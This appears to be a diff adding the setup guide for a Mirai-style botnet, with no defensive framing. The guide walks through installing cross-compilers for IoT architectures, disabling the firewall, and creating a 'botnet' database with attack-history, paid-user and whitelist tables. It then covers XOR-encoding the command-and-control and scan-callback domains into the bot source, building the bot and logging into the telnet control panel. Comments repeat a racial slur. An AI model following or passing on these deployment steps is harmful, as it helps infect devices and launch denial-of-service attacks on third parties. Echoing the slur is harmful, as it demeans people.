@@ -1,0 +1,149 @@
+run cmds:
+
+apt-get update -y
+apt-get install gcc golang electric-fence sudo git -y
+apt-get install nano make -y
+apt-get install apache2 -y 
+apt-get install screen -y
+REQURES DEBIAN 10
+// install golang(1.17+) 
+// so golang hates this mirai so we need 1.17 and 1.13 zzmap will help you here just ignore this for now babez<3
+
+before u start any of these steps go through the whole bot.c and change the ips to yours<3
+
+then execute these: 
+go get github.com/go-sql-driver/mysql
+go get github.com/mattn/go-shellwords
+
+run more cmds:
+
+mkdir /etc/xcompile
+cd /etc/xcompile
+ 
+ wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv4l.tar.bz2
+ wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i586.tar.bz2
+ wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-m68k.tar.bz2
+ wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mips.tar.bz2
+ wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mipsel.tar.bz2
+ wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-powerpc.tar.bz2
+ wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sh4.tar.bz2
+ wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sparc.tar.bz2
+ wget http://distro.ibiblio.org/slitaz/sources/packages/c/cross-compiler-armv6l.tar.bz2
+ wget https://landley.net/aboriginal/downloads/old/binaries/1.2.6/cross-compiler-armv7l.tar.bz2
+ 
+ tar -jxf cross-compiler-armv4l.tar.bz2
+ tar -jxf cross-compiler-i586.tar.bz2
+ tar -jxf cross-compiler-m68k.tar.bz2
+ tar -jxf cross-compiler-mips.tar.bz2
+ tar -jxf cross-compiler-mipsel.tar.bz2
+ tar -jxf cross-compiler-powerpc.tar.bz2
+ tar -jxf cross-compiler-sh4.tar.bz2
+ tar -jxf cross-compiler-sparc.tar.bz2
+ tar -jxf cross-compiler-armv6l.tar.bz2
+ tar -jxf cross-compiler-armv7l.tar.bz2
+ 
+ rm *.tar.bz2
+ mv cross-compiler-armv4l armv4l
+ mv cross-compiler-i586 i586
+ mv cross-compiler-m68k m68k
+ mv cross-compiler-mips mips
+ mv cross-compiler-mipsel mipsel
+ mv cross-compiler-powerpc powerpc
+ mv cross-compiler-sh4 sh4
+ mv cross-compiler-sparc sparc
+ mv cross-compiler-armv6l armv6l
+ mv cross-compiler-armv7l armv7l
+
+export PATH=$PATH:/etc/xcompile/armv4l/bin
+export PATH=$PATH:/etc/xcompile/armv6l/bin
+export PATH=$PATH:/etc/xcompile/i586/bin
+export PATH=$PATH:/etc/xcompile/m68k/bin
+export PATH=$PATH:/etc/xcompile/mips/bin
+export PATH=$PATH:/etc/xcompile/mipsel/bin
+export PATH=$PATH:/etc/xcompile/powerpc/bin
+export PATH=$PATH:/etc/xcompile/powerpc-440fp/bin
+export PATH=$PATH:/etc/xcompile/sh4/bin
+export PATH=$PATH:/etc/xcompile/sparc/bin
+export PATH=$PATH:/etc/xcompile/armv6l/bin
+export PATH=$PATH:/etc/xcompile/armv7l/bin
+
+
+service iptables stop
+/etc/ini.d/iptbales stop
+ 
+--Database Setup
+
+apt install mariadb-server -y
+
+mysql
+
+copy paste this into mysql:
+
+use mysql;
+alter user 'root'@'localhost' identified by 'root';
+CREATE DATABASE botnet;
+use botnet;
+
+CREATE TABLE `history` (
+  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
+  `user_id` int(10) unsigned NOT NULL,
+  `time_sent` int(10) unsigned NOT NULL,
+  `duration` int(10) unsigned NOT NULL,
+  `command` text NOT NULL,
+  `max_bots` int(11) DEFAULT '-1',
+  PRIMARY KEY (`id`),
+  KEY `user_id` (`user_id`)
+);
+ 
+CREATE TABLE `users` (
+  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
+  `username` varchar(32) NOT NULL,
+  `password` varchar(32) NOT NULL,
+  `duration_limit` int(10) unsigned DEFAULT NULL,
+  `cooldown` int(10) unsigned NOT NULL,
+  `wrc` int(10) unsigned DEFAULT NULL,
+  `last_paid` int(10) unsigned NOT NULL,
+  `max_bots` int(11) DEFAULT '-1',
+  `admin` int(10) unsigned DEFAULT '0',
+  `intvl` int(10) unsigned DEFAULT '30',
+  `api_key` text,
+  PRIMARY KEY (`id`),
+  KEY `username` (`username`)
+);
+ 
+CREATE TABLE `whitelist` (
+  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
+  `prefix` varchar(16) DEFAULT NULL,
+  `netmask` tinyint(3) unsigned DEFAULT NULL,
+  PRIMARY KEY (`id`),
+  KEY `prefix` (`prefix`)
+);
+
+INSERT INTO users VALUES (NULL, 'test', 'test', 0, 0, 0, 0, -1, 1, 30, '');
+
+				^^^^ CHANGE ME ^^^^
+exit;
+
+// DOMAIN NIGGER DOMAIN NIGGER DOMAIN NIGGER DOMAIN NIGGER DOMAIN NIGGER 
+for change domain:
+gcc enc.c -o xor
+./xor "your.domain.lol" # <-- replace the domain plz
+
+edit bot/table.c
+change these tables to the hex string you get:
+    add_entry(TABLE_CNC_DOMAIN, "\x1b\x1b\x1b", the_given_size_here);
+    add_entry(TABLE_SCAN_CB_DOMAIN, "hex_string_here", the_given_size_here);
+
+// DOMAIN NIGGER DOMAIN NIGGER DOMAIN NIGGER DOMAIN NIGGER DOMAIN NIGGER 
+
+service mysql restart
+cd ~/
+chmod 777 *
+./build.sh
+
+connection -
+ip: server ip
+port: 23382
+type: telnet
+escape key: skidrow
+login: the login you specified in mysql db
